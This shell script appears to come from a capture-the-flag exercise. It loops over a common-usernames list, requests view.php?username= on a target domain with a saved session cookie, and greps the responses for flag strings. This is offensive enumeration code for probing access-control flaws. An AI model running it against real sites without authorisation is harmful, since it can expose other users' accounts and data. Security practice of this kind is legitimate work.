#!/bin/sh
# Fuzzes view.php?username= with common usernames
# Usage: view-fuzzer.sh example.com
DOM=$1
DOM_DIR=~/recon/$DOM
COOKIE_FILE="$DOM_DIR/cookie.txt"
USERLIST="/Users/jerrod.long/git/SecLists/Usernames/top-usernames-shortlist.txt"
RESULTS_FILE="$DOM_DIR/view-results.txt"

[[ ! -d $DOM_DIR ]] && { echo "${DOM_DIR} does not exist."; exit 1; }
[[ ! -f $COOKIE_FILE ]] && { echo "Cookie file not found. Run register-login.sh first."; exit 1; }

echo "Fuzzing view.php with usernames..." > "$RESULTS_FILE"

for user in $(cat "$USERLIST"); do
    echo "Testing username: $user" | tee -a "$RESULTS_FILE"
    curl -s -b "$COOKIE_FILE" "http://$DOM/view.php?username=$user" | tee -a "$RESULTS_FILE"
done

grep -iE 'flag|ctf|\{.*\}' "$RESULTS_FILE" > "$DOM_DIR/view-flags.txt"
